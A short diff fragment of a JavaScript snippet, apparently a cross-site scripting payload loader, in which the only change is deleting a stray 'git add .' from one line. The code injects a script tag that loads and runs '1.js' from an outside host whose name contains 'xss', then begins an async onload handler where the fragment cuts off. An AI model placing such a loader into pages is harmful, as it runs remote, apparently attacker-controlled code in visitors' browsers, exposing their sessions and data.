@@ -1,7 +1,7 @@
 (function () {
     var s1 = document.createElement('script');
     s1.src = 'https://xss.beishanxueyuan.com/1.js';
-    document.body.appendChild(s1);git add .
+    document.body.appendChild(s1);
   
     s1.onload = async function () {
       try {
